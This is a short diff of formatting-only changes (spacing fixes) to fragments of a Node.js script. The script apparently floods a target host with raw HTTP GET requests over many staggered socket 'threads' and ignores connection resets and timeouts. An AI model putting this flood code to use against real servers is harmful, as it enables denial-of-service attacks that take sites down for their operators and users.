@@ -11,7 +11,7 @@ var loadTimeSum = 0;
 var loadDataAmount = 0;
 
 function createRequest(path) {
-  return`GET ${path} HTTP/1.1
+  return `GET ${path} HTTP/1.1
 Host: ${_url.hostname}
 
 `;
@@ -27,7 +27,7 @@ dns.lookup(_url.hostname, {family: 4}, function (err, address) {
       socket.write(data)
     });
     socket.on('error', function (err) {
-      if ('ECONNRESET' === err.code|| 'ETIMEDOUT' === err.code) {
+      if ('ECONNRESET' === err.code || 'ETIMEDOUT' === err.code) {
       }
       else {
         console.error(err);
@@ -52,7 +52,7 @@ dns.lookup(_url.hostname, {family: 4}, function (err, address) {
     console.error(err)
   }
   else {
-    for(let i = 0; i < threadsCount; i++) {
+    for (let i = 0; i < threadsCount; i++) {
       setTimeout(attack, i * 20);
     }
   }
